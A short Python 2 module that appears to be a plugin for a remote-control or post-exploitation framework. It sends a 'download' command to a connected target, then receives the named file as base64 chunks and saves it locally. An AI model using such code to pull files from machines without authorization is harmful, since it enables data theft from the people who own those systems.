import os
import base64


def run(target, filepath):
	print "[*] Downloading %s..." % filepath
	target["out"].put("download")
	target["out"].put(filepath)
	localfile = os.path.basename(filepath)
	while os.path.exists(localfile):
		localfile = "dl_" + localfile
	fd = open(localfile, 'ab')
	while True:
		file_data = target["in"].get()
		if file_data == "END_OF_FILE":
			break
		chunk = base64.b64decode(file_data)
		fd.write(chunk)
		target["out"].put("")
	fd.close()
	target["out"].put("")
	print "[*] Saved as %s" % localfile
